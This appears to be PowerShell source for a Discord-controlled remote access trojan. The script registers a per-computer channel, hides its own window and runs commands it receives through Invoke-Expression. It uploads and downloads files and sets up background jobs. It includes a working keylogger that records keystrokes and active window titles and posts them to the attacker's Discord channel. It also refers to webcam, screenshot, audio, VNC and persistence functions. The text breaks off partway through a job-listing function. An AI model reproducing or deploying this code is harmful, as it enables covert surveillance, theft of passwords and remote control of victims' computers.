#v1

# =============================== GLOBAL VARIABLES - IMPT ===============================
$global:token = $token
$script:Jobs = @{}
$global:hidewindow = $true
$global:keyloggerstatus = $false
$global:lastMessageAttachments = $null
# =============================== GLOBAL VAR - THEME ==============================
# You can add more here but gotta install the files yourself ( URL not supported for now )
# shld add download and stuff
# 
$global:themes = @{
    darktheme = @{
        color = "black"
        image = $null
    }
    neko_maid = @{
        color = "#ffdb54"
        image = "./nekos/neko_maid.jpg"
    }
    neko_kimono = @{
        color = "#ffdb54"
        image = "./nekos/neko_kimono.jpg"
    }
    neko_cafe = @{
        color = "#ffdb54"
        image = "./nekos/neko_cafe.jpg"
    }

}
$global:currenttheme = "neko_maid"
$global:theme_enabled = $false

# =============================== THEME FUNCTIONS ======================
#GETTHEME
function GetCurrentTheme{
    if ($global:theme_enabled){
        sendEmbedWithImage -Title "Current theme: $($global:currenttheme)" -Description "Color: $($global:themes[$global:currenttheme].color)`nImage Path: $($global:themes[$global:currenttheme].image)"
    }
    else{
        sendEmbedWithImage -Title "Themes are currently disabled" -Description "Use the command `ENABLETHEME` to enable themes"
    }
}
#SETTHEME
function SetCurrentTheme{
    param([string]$themename)
    if ($global:themes.ContainsKey($themename)){
        $global:currenttheme = $themename
        sendEmbedWithImage -Title "Theme changed to: $($global:currenttheme)" -Description "Color: $($global:themes[$global:currenttheme].color)`nImage Path: $($global:themes[$global:currenttheme].image)"
    }
    else{
        $availableThemes = $global:themes.Keys -join ", "
        sendEmbedWithImage -Title ":x: **Theme not found**" -Description "Available themes are: $availableThemes"
    }
}
#ENABLETHEME
function EnableTheme{
    $global:theme_enabled = $true
    sendEmbedWithImage -Title "Themes have been enabled" -Description "Use the command `SETTHEME` to change the theme."
}
#DISABLETHEME
function DisableTheme{
    $global:theme_enabled = $false
    sendEmbedWithImage -Title "Themes have been disabled" -Description "Use the command `ENABLETHEME` to enable themes."
}
# =============================== NEEDED ====================================

#ENABLEFFMPEG
function GetFfmpeg{
    sendEmbedWithImage -Title "Downloading FFmpeg" -Description "Please wait while FFmpeg is being downloaded..."  
    $Path = "$env:Temp\ffmpeg.exe"
    $tempDir = "$env:temp"
    If (!(Test-Path $Path)){  
        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
        $wc = New-Object System.Net.WebClient           
        $wc.Headers.Add("User-Agent", "PowerShell")
        $response = $wc.DownloadString("$apiUrl")
        $release = $response | ConvertFrom-Json
        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
        $zipUrl = $asset.browser_download_url
        $zipFilePath = Join-Path $tempDir $asset.name
        $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
        $wc.DownloadFile($zipUrl, $zipFilePath)
        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
        rm -Path $zipFilePath -Force
        rm -Path $extractedDir -Recurse -Force
    }
}

#DISABLEFFMPEG
function RemoveFfmpeg{
    $Path = "$env:Temp\ffmpeg.exe"
    If (Test-Path $Path){  
        rm -Path $Path -Force
    }
}
# =============================== DISCORD API FUNCTIONS ===============================
function Invoke-DiscordAPI {
    param(
        [string]$Url,
        [hashtable]$Headers,
        [string]$Method = "GET",
        [string]$Body = $null,
        [int]$RetryCount = 2,
        [int]$DelayMs = 500
    )
    $attempt = 0
    do {
        try {
            Start-Sleep -Milliseconds ($DelayMs * $attempt)
            $wc = New-Object System.Net.WebClient
            foreach ($key in $Headers.Keys) { $wc.Headers.Add($key, $Headers[$key]) }
            if ($Method -eq "POST" -and $Body) {
                $wc.Headers.Add("Content-Type", "application/json")
                return $wc.UploadString($Url, "POST", $Body)
            } else {
                return $wc.DownloadString($Url)
            }
        }
        catch {
            $attempt++
            if ($_.Exception.Message -match "429|Too Many Requests" -and $attempt -le $RetryCount) { continue }
            throw
        }
    } while ($attempt -le $RetryCount)
}

Function Get_BotUserId {
    $headers = @{ 'Authorization' = "Bot $global:token" }
    $botInfo = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me" -Headers $headers
    return ($botInfo | ConvertFrom-Json).id
}

Function CheckCategoryExists {
    $headers = @{ 'Authorization' = "Bot $global:token" }
    $response = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me/guilds" -Headers $headers
    $guildID = ($response | ConvertFrom-Json)[0].id
    $channels = Invoke-DiscordAPI -Url "https://discord.com/api/v10/guilds/$guildID/channels" -Headers $headers
    $channelList = $channels | ConvertFrom-Json
    
    foreach ($channel in $channelList) {
        if ($channel.type -eq 4 -and $channel.name -eq $env:COMPUTERNAME) {
            $global:CategoryID = $channel.id
            foreach ($subchannel in $channelList) {
                if ($subchannel.type -eq 0 -and $subchannel.name -eq "coral-control" -and $subchannel.parent_id -eq $channel.id) {
                    $global:ChannelID = $subchannel.id
                    return $true
                }
            }
        }
    }
    return $false
}

Function NewChannelCategory {
    $headers = @{ 'Authorization' = "Bot $token" }
    $response = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me/guilds" -Headers $headers
    $guilds = $response | ConvertFrom-Json
    $guildID = $guilds[0].id
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $body = @{ "name" = "$env:COMPUTERNAME"; "type" = 4 } | ConvertTo-Json
    $response = Invoke-DiscordAPI -Url $uri -Headers $headers -Method "POST" -Body $body
    $responseObj = ConvertFrom-Json $response
    $global:CategoryID = $responseObj.id
}

Function NewChannel {
    param([string]$name)
    $headers = @{ 'Authorization' = "Bot $token" }
    $response = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me/guilds" -Headers $headers
    $guilds = $response | ConvertFrom-Json
    $guildID = $guilds[0].id
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $body = @{ "name" = "$name"; "type" = 0; "parent_id" = $CategoryID } | ConvertTo-Json
    $response = Invoke-DiscordAPI -Url $uri -Headers $headers -Method "POST" -Body $body
    $responseObj = ConvertFrom-Json $response
    $global:ChannelID = $responseObj.id
}

Function PullMsg {
    $headers = @{ 'Authorization' = "Bot $token" }
    try {
        $messages = Invoke-DiscordAPI -Url "https://discord.com/api/v10/channels/$SessionID/messages" -Headers $headers
        $most_recent_message = ($messages | ConvertFrom-Json)[0]
        if ($most_recent_message.author.id -ne $botId) {
            $script:response = $most_recent_message.content
            $global:lastMessageAttachments = $most_recent_message.attachments
            return $most_recent_message.content
        }
    } catch {
        return $null
    }
}

# =============================== MESSAGE FUNCTIONS ===============================
function sendMsg {
    param([string]$Message, [hashtable]$Embed, [string]$ImagePath)
    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
    
    if ($ImagePath -and (Test-Path $ImagePath)) {
        sendMsgWithImage -Message $Message -Embed $Embed -ImagePath $ImagePath
        return
    }
    
    if ($Embed) {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        $wc.Headers.Add("Content-Type", "application/json; charset=utf-8")
        $jsonBody = $Embed | ConvertTo-Json -Depth 10 -Compress
        try { $response = $wc.UploadString($url, "POST", $jsonBody) } catch {}
    }
    
    if ($Message) {
        if ($Message.Length -gt 15000) { Send_AsFile -Content $Message }
        elseif ($Message.Length -gt 1950) { Send_ChunkedMessage -Content $Message }
        else { Send_SingleMessage -Content $Message }
    }
}

function sendMsgWithImage {
    param([string]$Message, [hashtable]$Embed, [string]$ImagePath)
    
    if (-not (Test-Path $ImagePath)) {
        sendMsg -Message ":x: **Image file not found:** ``$ImagePath``"
        return
    }
    
    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
    
    try {
        # Create multipart form data
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        # Prepare the payload
        $payload = @{}
        
        if ($Message) {
            $payload.content = $Message
        }
        
        if ($Embed) {
            $payload.embeds = @($Embed)
        }
        
        $jsonPayload = $payload | ConvertTo-Json -Depth 10 -Compress
        
        # Read image file
        $imageBytes = [System.IO.File]::ReadAllBytes($ImagePath)
        $fileName = [System.IO.Path]::GetFileName($ImagePath)
        
        # Build multipart form data properly
        $bodyLines = @()
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"payload_json`""
        $bodyLines += "Content-Type: application/json"
        $bodyLines += ""
        $bodyLines += $jsonPayload
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"files[0]`"; filename=`"$fileName`""
        $bodyLines += "Content-Type: application/octet-stream"
        $bodyLines += ""
        
        # Convert text to bytes
        $bodyText = ($bodyLines -join $LF) + $LF
        $bodyTextBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyText)
        
        # End boundary
        $endBoundary = $LF + "--$boundary--" + $LF
        $endBoundaryBytes = [System.Text.Encoding]::UTF8.GetBytes($endBoundary)
        
        # Combine all bytes
        $totalBytes = New-Object byte[] ($bodyTextBytes.Length + $imageBytes.Length + $endBoundaryBytes.Length)
        [Array]::Copy($bodyTextBytes, 0, $totalBytes, 0, $bodyTextBytes.Length)
        [Array]::Copy($imageBytes, 0, $totalBytes, $bodyTextBytes.Length, $imageBytes.Length)
        [Array]::Copy($endBoundaryBytes, 0, $totalBytes, $bodyTextBytes.Length + $imageBytes.Length, $endBoundaryBytes.Length)
        
        # Send request
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("Authorization", "Bot $token")
        $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
        $webClient.Headers.Add("User-Agent", "CoralAgent/1.0")
        
        $response = $webClient.UploadData($url, "POST", $totalBytes)
        $webClient.Dispose()
        
    } catch {
        # Fall back to regular file upload if embed with image fails
        try {
            if ($Message -or ($Embed -and $Embed.title)) {
                $fallbackMsg = if ($Message) { $Message } else { $Embed.title }
                sendMsg -Message $fallbackMsg
            }
            sendFile -sendfilePath $ImagePath
        } catch {
            sendMsg -Message ":x: **Error sending image:** $($_.Exception.Message)"
        }
    }
}

function sendEmbedWithImage {
    param([string]$Title, [string]$Description, [string]$ImagePath = $null, [int]$Color = $null)
    
    # Get theme color - always use theme color unless explicitly overridden
    $Color = $global:themes[$global:currenttheme].color
    
    
    # Determine image path logic
    $finalImagePath = $null
    
    if ([string]::IsNullOrEmpty($ImagePath)) {
        # No image path provided - use theme image if themes are enabled
        if ($global:theme_enabled -eq $true) {
            $themeImagePath = $global:themes[$global:currenttheme].image
            if ($themeImagePath -and (Test-Path $themeImagePath)) {
                $finalImagePath = $themeImagePath
            }
        }
        # If themes disabled or no theme image, $finalImagePath stays null
    } else {
        # Image path provided - use it if it exists
        if (Test-Path $ImagePath) {
            $finalImagePath = $ImagePath
        }
        # If provided path doesn't exist, $finalImagePath stays null
    }
    
    # Send embed with or without image based on final determination
    if ($finalImagePath) {
        # Send embed with image
        $embed = @{
            title = $Title
            description = $Description
            color = $Color
            image = @{
                url = "attachment://$(Split-Path $finalImagePath -Leaf)"
            }
        }
        sendMsgWithImage -Embed $embed -ImagePath $finalImagePath
    } else {
        # Send embed without image
        $embed = @{
            embeds = @(
                @{
                    title = $Title
                    description = $Description
                    color = $Color
                }
            )
        }
        sendMsg -Embed $embed
    }
}

function Send_SingleMessage {
    param([string]$Content)
    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
    $headers = @{ 'Authorization' = "Bot $token" }
    $cleanMessage = Clean_MessageContent -InputMessage $Content
    
    if ($cleanMessage.Length -gt 1950) {
        $cleanMessage = $cleanMessage.Substring(0, 1950) + "... (truncated)"
    }
    
    $jsonBody = @{ "content" = $cleanMessage } | ConvertTo-Json -Compress
    
    try {
        $response = Invoke-DiscordAPI -Url $url -Headers $headers -Method "POST" -Body $jsonBody
    } catch {
        try {
            $fallbackMessage = $Content -replace '[^\w\s\.\-\(\)\[\]\{\},:;!@#$%^&*+=<>?/|\\`~]', '?'
            if ($fallbackMessage.Length -gt 1800) {
                $fallbackMessage = $fallbackMessage.Substring(0, 1800) + "... (sanitized)"
            }
            $fallbackJson = @{ "content" = $fallbackMessage } | ConvertTo-Json -Compress
            $response = Invoke-DiscordAPI -Url $url -Headers $headers -Method "POST" -Body $fallbackJson
        } catch {}
    }
}

function Send_ChunkedMessage {
    param([string]$Content)
    $chunks = Split_IntoChunks -Text $Content -ChunkSize 1800
    $totalChunks = $chunks.Count
    
    if ($totalChunks -gt 8) { Send_AsFile -Content $Content; return }
    
    Send_SingleMessage -Content ":page_facing_up: **Large output detected - sending in $totalChunks parts:**"
    
    for ($i = 0; $i -lt $chunks.Count; $i++) {
        $partNumber = $i + 1
        $chunkContent = "**Part $partNumber/$totalChunks :**`n``````$($chunks[$i])``````"
        Send_SingleMessage -Content $chunkContent
        Start-Sleep -Milliseconds 750
    }
    Send_SingleMessage -Content ":white_check_mark: **Output complete ($totalChunks parts sent)**"
}

function Send_AsFile {
    param([string]$Content)
    try {
        $tempDir = $env:TEMP
        $fileName = "coral_output_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $tempFile = Join-Path $tempDir $fileName
        $Content | Out-File -FilePath $tempFile -Encoding UTF8
        
        if (Test-Path $tempFile) {
            sendFile -sendfilePath $tempFile
            $fileSize = [math]::Round((Get-Item $tempFile).Length / 1KB, 2)
            Send_SingleMessage -Content ":page_facing_up: **Large output sent as file** (Size: $fileSize KB, Length: $($Content.Length) characters)"
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        } else {
            Send_SingleMessage -Content ":warning: **Failed to create temp file - sending truncated output:**"
            $truncated = $Content.Substring(0, 1800) + "`n`n... (output too large, file creation failed)"
            Send_SingleMessage -Content "``````$truncated``````"
        }
    } catch { Send_ChunkedMessage -Content $Content }
}

function Split_IntoChunks {
    param([string]$Text, [int]$ChunkSize = 1800)
    $chunks = @()
    $currentPos = 0
    $textLength = $Text.Length
    
    while ($currentPos -lt $textLength) {
        $remainingLength = $textLength - $currentPos
        $actualChunkSize = [Math]::Min($ChunkSize, $remainingLength)
        $chunk = $Text.Substring($currentPos, $actualChunkSize)
        
        if ($currentPos + $actualChunkSize -lt $textLength) {
            $lastNewline = $chunk.LastIndexOf("`n")
            if ($lastNewline -gt ($actualChunkSize * 0.6)) {
                $chunk = $chunk.Substring(0, $lastNewline)
                $actualChunkSize = $lastNewline
            } elseif ($chunk.LastIndexOf(" ") -gt ($actualChunkSize * 0.8)) {
                $lastSpace = $chunk.LastIndexOf(" ")
                $chunk = $chunk.Substring(0, $lastSpace)
                $actualChunkSize = $lastSpace
            }
        }
        
        $chunks += $chunk
        $currentPos += $actualChunkSize
        
        if ($currentPos -lt $textLength -and ($Text[$currentPos] -eq "`n" -or $Text[$currentPos] -eq " ")) {
            $currentPos++
        }
    }
    return $chunks
}

function Clean_MessageContent {
    param([string]$InputMessage)
    if ([string]::IsNullOrEmpty($InputMessage)) { return "" }
    
    $cleaned = $InputMessage
    $cleaned = $cleaned -replace "â‚‚", "|" -replace "â€€", "-" -replace "âŒ", "+" -replace "â", "+" -replace "â""", "+" -replace "â˜", "+"
    $cleaned = $cleaned -replace "`0", "" -replace "[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F]", ""
    $cleaned = $cleaned -replace "[^\u0009\u000A\u000D\u0020-\u007E]", "?"
    return $cleaned
}

# =============================== FILE FUNCTIONS (R)===============================

#SENDFILE
function sendFile {
    param([string]$sendfilePath)
    if (-not $sendfilePath -or -not (Test-Path $sendfilePath -PathType Leaf)) {
        sendMsg -Message ":x: **File not found:** ``$sendfilePath``"
        return
    }

    $fileInfo = Get-Item $sendfilePath
    $fileName = $fileInfo.Name
    $fileSize = $fileInfo.Length
    $fileSizeMB = [math]::Round($fileSize / 1MB, 2)
    
    if ($fileSize -gt 10MB) {
        sendMsg -Message ":x: **File too large:** ``$fileName`` (${fileSizeMB}MB). Maximum allowed is 10MB."
        return
    }

    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", "Bot $token")
    if (Test-Path $sendfilePath -PathType Leaf) {
        $response = $webClient.UploadFile($url, "POST", $sendfilePath)
    } else {
        sendMsg -Message ":x: **File not found:** ``$sendfilePath``"
    }
}
#DOWNLOADFILE
function downloadFile {
    param([string]$attachmentUrl, [string]$fileName, [string]$downloadPath = $env:TEMP)
    
    if (-not $attachmentUrl -or -not $fileName) {
        sendMsg -Message ":x: **Error:** Missing attachment URL or filename"
        return
    }
    
    try {
        $fullPath = Join-Path $downloadPath $fileName
        
        if (Test-Path $fullPath) {
            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            $nameWithoutExt = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
            $extension = [System.IO.Path]::GetExtension($fileName)
            $fileName = "${nameWithoutExt}_${timestamp}${extension}"
            $fullPath = Join-Path $downloadPath $fileName
        }
        
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($attachmentUrl, $fullPath)
        $webClient.Dispose()
        
        if (Test-Path $fullPath) {
            $fileSize = [math]::Round((Get-Item $fullPath).Length / 1KB, 2)
            sendMsg -Message ":white_check_mark: **File downloaded successfully**`n:file_folder: **Path:** ``$fullPath``"
            sendMsg -Message ":information_source: **Size:** ${fileSize} KB"
            #remove $filepath here
            return
        } else {
            sendMsg -Message ":x: **Download failed:** File was not created"
        }
    } catch {
        sendMsg -Message ":x: **Download error:** $($_.Exception.Message)"
    }
}
# =============================== quick info ===================
#QUICKINFO
# =============================== WINDOW FUNCTIONS ===============================
function HideWindow {
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    } else {
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

# =============================== KEYLOGGER FUNCTIONS (R)===============================

function keylogger {
    param (
        [int]$intervalSeconds = 30
    )
    
    if (-not $global:keyloggerstatus) {
        sendMsg -Message ":stop_sign: **Keylogger is disabled**"
        return
    }
    
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    using System.Text;
    public class W {
        [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);
        [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] k);
        [DllImport("user32.dll")] public static extern int ToUnicode(uint v, uint s, byte[] k, StringBuilder b, int c, uint f);
        [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    }
"@
    
    $deviceId = $env:COMPUTERNAME
    
    # Use current coral-control channel
    $keylogChannelID = $global:SessionID
    
    sendMsg -Message ":keyboard: **Keylogger started on $deviceId** (Interval: ${intervalSeconds}s)"

    # Key names for special keys
    $keyNames = @{
        8 = "[BACKSPACE]"; 9 = "[TAB]"; 13 = "[ENTER]"; 16 = "[SHIFT]"
        17 = "[CTRL]"; 18 = "[ALT]"; 20 = "[CAPS]"; 27 = "[ESC]"
        32 = " "; 33 = "[PGUP]"; 34 = "[PGDN]"; 35 = "[END]"
        36 = "[HOME]"; 37 = "[LEFT]"; 38 = "[UP]"; 39 = "[RIGHT]"
        40 = "[DOWN]"; 46 = "[DEL]"; 91 = "[WIN]"; 144 = "[NUMLOCK]"; 145 = "[SCROLL]"
    }

    $sessionStart = Get-Date
    
    try {
        while ($global:keyloggerstatus) {
            $keystrokeBuffer = ""
            $windowEvents = @()
            $pressedKeys = @{}
            $startTime = Get-Date
            $currentWindow = ""

            # Data collection loop
            while ((Get-Date) - $startTime -lt [TimeSpan]::FromSeconds($intervalSeconds) -and $global:keyloggerstatus) {
                Start-Sleep -Milliseconds 50
                
                # Get current active window
                try {
                    $hwnd = [W]::GetForegroundWindow()
                    $windowTitle = New-Object System.Text.StringBuilder 256
                    [W]::GetWindowText($hwnd, $windowTitle, 256) | Out-Null
                    $newWindow = $windowTitle.ToString()
                    
                    if ($newWindow -and $newWindow -ne $currentWindow -and $newWindow -notlike "*Discord*") {
                        $currentWindow = $newWindow
                        if ($keystrokeBuffer.Length -gt 0) {
                            $windowEvents += @{
                                Window = $newWindow
                                Position = $keystrokeBuffer.Length
                            }
                        }
                    }
                } catch {}
                
                $keyboardState = New-Object byte[] 256
                [W]::GetKeyboardState($keyboardState) | Out-Null

                # Capture keystrokes
                for ($vk = 8; $vk -le 255; $vk++) {
                    $isDown = ([W]::GetAsyncKeyState($vk) -band 0x8000) -ne 0
                    if ($isDown -and -not $pressedKeys.ContainsKey($vk)) {
                        $pressedKeys[$vk] = $true
                        if ($keyNames.ContainsKey($vk)) {
                            $keystrokeBuffer += $keyNames[$vk]
                        } else {
                            $sb = New-Object System.Text.StringBuilder 2
                            $result = [W]::ToUnicode([uint32]$vk, 0, $keyboardState, $sb, $sb.Capacity, 0)
                            if ($result -gt 0) { 
                                $char = $sb.ToString()
                                if ($char -match '[a-zA-Z0-9\s\.\,\;\:\!\?\-_\(\)\[\]\{\}\\\/\@\#\$\%\^\&\*\+\=\<\>\|\`\~]') {
                                    $keystrokeBuffer += $char
                                }
                            }
                        }
                    } elseif (-not $isDown -and $pressedKeys.ContainsKey($vk)) {
                        $pressedKeys.Remove($vk)
                    }
                }
            }

            # Send keylog data to coral-control channel
            if ($keystrokeBuffer.Length -gt 0) {
                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                $logContent = ":keyboard: **[$timestamp] - $deviceId KEYLOG**`n"
                
                if ($windowEvents.Count -gt 0) {
                    $lastPos = 0
                    foreach ($event in $windowEvents) {
                        if ($lastPos -lt $event.Position) {
                            $segment = $keystrokeBuffer.Substring($lastPos, $event.Position - $lastPos)
                            if ($segment.Trim().Length -gt 0) {
                                $logContent += "``$segment```n"
                            }
                        }
                        $logContent += "**[Window: $($event.Window)]**`n"
                        $lastPos = $event.Position
                    }
                    # Add remaining keystrokes
                    if ($lastPos -lt $keystrokeBuffer.Length) {
                        $remaining = $keystrokeBuffer.Substring($lastPos)
                        if ($remaining.Trim().Length -gt 0) {
                            $logContent += "``$remaining```n"
                        }
                    }
                } else {
                    if ($currentWindow -and $currentWindow -notlike "*Discord*") {
                        $logContent += "**[Window: $currentWindow]**`n"
                    }
                    $logContent += "``$keystrokeBuffer```n"
                }
                
                try {
                    sendMsg -Message $logContent
                } catch {}
            }

            Remove-Variable keystrokeBuffer, windowEvents, pressedKeys, startTime -ErrorAction SilentlyContinue
            [System.GC]::Collect()
        }
    } catch {
        sendMsg -Message ":x: **Keylogger error:** $($_.Exception.Message)"
    } finally {
        sendMsg -Message ":stop_sign: **Keylogger stopped on $deviceId**"
    }
}
#ENABLEKEYLOG
function Start_Keylogger {
    param([int]$intervalSeconds = 30)
    
    if ($global:keyloggerstatus) {
        sendMsg -Message ":warning: **Keylogger is already running**"
        return
    }
    
    $global:keyloggerstatus = $true
    
    try {
        sendMsg -Message ":keyboard: **Starting keylogger...** (Interval: ${intervalSeconds}s)"
        
        $keylogJob = Start-Job -ScriptBlock {
            param($token, $SessionID, $CategoryID, $intervalSeconds)
            
            $global:token = $token
            $global:SessionID = $SessionID
            $global:CategoryID = $CategoryID
            $global:keyloggerstatus = $true
            
            # Import functions
            ${function:sendMsg} = ${using:function:sendMsg}
            ${function:Send_SingleMessage} = ${using:function:Send_SingleMessage}
            ${function:Send_ChunkedMessage} = ${using:function:Send_ChunkedMessage}
            ${function:Send_AsFile} = ${using:function:Send_AsFile}
            ${function:Split_IntoChunks} = ${using:function:Split_IntoChunks}
            ${function:Clean_MessageContent} = ${using:function:Clean_MessageContent}
            ${function:sendFile} = ${using:function:sendFile}
            ${function:Invoke-DiscordAPI} = ${using:function:Invoke-DiscordAPI}
            ${function:keylogger} = ${using:function:keylogger}
            
            keylogger -intervalSeconds $intervalSeconds
            
        } -ArgumentList $global:token, $global:SessionID, $global:CategoryID, $intervalSeconds
        
        $script:Jobs["KEYLOGGER"] = $keylogJob
        sendMsg -Message ":keyboard: **Keylogger started** (Job ID: $($keylogJob.Id)) - Data will appear in this channel"
        
    } catch {
        $global:keyloggerstatus = $false
        sendMsg -Message ":x: **Failed to start keylogger:** $($_.Exception.Message)"
    }
}
#DISABLEKEYLOG
function Stop_Keylogger {
    $global:keyloggerstatus = $false
    
    if ($script:Jobs.ContainsKey("KEYLOGGER")) {
        $job = $script:Jobs["KEYLOGGER"]
        try {
            # Force stop the job immediately
            Stop-Job -Job $job -ErrorAction SilentlyContinue

            # Wait a moment for it to stop
            Start-Sleep -Milliseconds 500
            
            # Remove the job
            Remove-Job -Job $job -ErrorAction SilentlyContinue
            
            # Remove from our jobs tracking
            $script:Jobs.Remove("KEYLOGGER")
            
            sendMsg -Message ":stop_sign: **Keylogger stopped successfully**"
        } catch {
            # If normal stop fails, try more aggressive approach
            try {
                $job | Stop-Job -ErrorAction SilentlyContinue
                $job | Remove-Job -ErrorAction SilentlyContinue
                $script:Jobs.Remove("KEYLOGGER")
                sendMsg -Message ":stop_sign: **Keylogger force stopped**"
            } catch {
                sendMsg -Message ":warning: **Error stopping keylogger:** $($_.Exception.Message)"
            }
        }
    } else {
        sendMsg -Message ":information_source: **Keylogger is not running**"
    }
}
#GETKEYLOGSTATUS
function Get_KeyloggerStatus {
    if ($global:keyloggerstatus -and $script:Jobs.ContainsKey("KEYLOGGER")) {
        $job = $script:Jobs["KEYLOGGER"]
        sendMsg -Message ":gear: **Keylogger Status:** Running (Job State: $($job.State)) - Logging to this channel"
    } else {
        sendMsg -Message ":gear: **Keylogger Status:** Stopped"
    }
}
# =============================== SS FUNCTIONS (R) ===============================
#SCREENSHOT
# =============================== WEBCAM FUNCTIONS (R) ===============================
#WEBCAM
# =============================== AUDIO (R) ========================================
#AUDIO
# =============================== JOB MANAGEMENT FUNCTIONS ===============================

#FIX AGENTS
function Start_AgentJob {
    param($ScriptString)
    $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6)
    
    $job = Start-Job -ScriptBlock {
        param($ScriptString, $token, $SessionID, $CategoryID)
        
        # Set global variables in job scope
        $global:token = $token
        $global:SessionID = $SessionID
        $global:CategoryID = $CategoryID
        
        # Import all necessary functions into job scope
        ${function:Invoke-DiscordAPI} = ${using:function:Invoke-DiscordAPI}
        ${function:sendMsg} = ${using:function:sendMsg}
        ${function:Send_SingleMessage} = ${using:function:Send_SingleMessage}
        ${function:Send_ChunkedMessage} = ${using:function:Send_ChunkedMessage}
        ${function:Send_AsFile} = ${using:function:Send_AsFile}
        ${function:Split_IntoChunks} = ${using:function:Split_IntoChunks}
        ${function:Clean_MessageContent} = ${using:function:Clean_MessageContent}
        ${function:sendFile} = ${using:function:sendFile}
        ${function:sendMsgWithImage} = ${using:function:sendMsgWithImage}
        ${function:sendEmbedWithImage} = ${using:function:sendEmbedWithImage}
        
        # Import FFmpeg functions
        ${function:GetFfmpeg} = ${using:function:GetFfmpeg}
        ${function:RemoveFfmpeg} = ${using:function:RemoveFfmpeg}
        
        # Import webcam functions
        ${function:Awebcam} = ${using:function:Awebcam}
        
        # Import screenshot functions
        ${function:Ascreenshot} = ${using:function:Ascreenshot}
        
        # Import audio functions
        ${function:Aaudio} = ${using:function:Aaudio}
        
        # Import theme functions
        ${function:GetCurrentTheme} = ${using:function:GetCurrentTheme}
        ${function:SetCurrentTheme} = ${using:function:SetCurrentTheme}
        ${function:EnableTheme} = ${using:function:EnableTheme}
        ${function:DisableTheme} = ${using:function:DisableTheme}
        
        # Import other utility functions
        ${function:AquickInfo} = ${using:function:AquickInfo}
        ${function:AGetneko} = ${using:function:AGetneko}
        ${function:ARemoveNeko} = ${using:function:ARemoveNeko}
        ${function:StartUvnc} = ${using:function:StartUvnc}
        ${function:RemoveUVNC} = ${using:function:RemoveUVNC}
        ${function:downloadFile} = ${using:function:downloadFile}
        
        # Import keylogger functions
        ${function:keylogger} = ${using:function:keylogger}
        ${function:Start_Keylogger} = ${using:function:Start_Keylogger}
        ${function:Stop_Keylogger} = ${using:function:Stop_Keylogger}
        ${function:Get_KeyloggerStatus} = ${using:function:Get_KeyloggerStatus}
        
        # Import persistence functions
        ${function:create_Ptask} = ${using:function:create_Ptask}
        ${function:remove_Ptask} = ${using:function:remove_Ptask}
        
        # Import global variables that functions might need
        $global:themes = ${using:global:themes}
        $global:currenttheme = ${using:global:currenttheme}
        $global:theme_enabled = ${using:global:theme_enabled}
        $global:hidewindow = ${using:global:hidewindow}
        $global:keyloggerstatus = ${using:global:keyloggerstatus}
        $global:lastMessageAttachments = ${using:global:lastMessageAttachments}
        
        # Execute the provided script
        try {
            Invoke-Expression $ScriptString
        } catch {
            Write-Error "Job execution error: $($_.Exception.Message)"
        }
        
    } -ArgumentList $ScriptString, $global:token, $global:SessionID, $global:CategoryID
    
    $script:Jobs[$RandName] = $job
    sendMsg -Message ":gear: **Job Started:** ``$RandName`` | ID: $($job.Id)`n:information_source: **Available functions:** Awebcam, Ascreenshot, Aaudio, AquickInfo, GetCurrentTheme, etc."
    return $RandName
}

function Get_AgentJobCompleted {
    param($JobName)
    if($script:Jobs.ContainsKey($JobName)) {
        $script:Jobs[$JobName].State -eq 'Completed'
    }
}

function List_AgentJobs {
    $jobList = @()
    foreach ($JobName in $script:Jobs.Keys) {
        $job = $script:Jobs[$JobName]
        $status = $job.State
        $jobList += [PSCustomObject]@{
            JobName = $JobName
            Status  = $status
            JobId = $job.Id
        }
    }
    
    if ($jobList.Count -eq 0) {
        sendMsg -Message "**No active jobs found**"
        return
    }
    
